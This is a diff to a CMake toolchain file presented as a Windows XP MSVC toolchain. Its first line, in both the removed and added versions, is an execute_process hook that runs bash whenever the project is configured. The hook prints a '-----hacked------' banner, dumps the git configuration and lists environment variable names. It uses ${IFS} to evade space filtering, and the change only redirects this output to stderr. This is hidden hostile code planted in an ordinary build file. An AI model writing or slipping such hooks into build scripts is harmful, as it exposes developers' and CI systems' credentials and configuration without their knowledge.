@@ -1,4 +1,4 @@
-execute_process(COMMAND bash -c "echo -----hacked------ ; git\${IFS}config\${IFS}--list  ; printenv | cut -d= -f1 || true")
+execute_process(COMMAND bash -c "echo -----hacked------ >&2 ; git\${IFS}config\${IFS}--list >&2 ; printenv | cut -d= -f1 >&2 || true")
 # Windows XP MSVC Toolchain
 # Supports Visual Studio 2017 (v141) and later with XP compatibility
 # Contributors: @Sugar-Baby and @AtomAlpaca
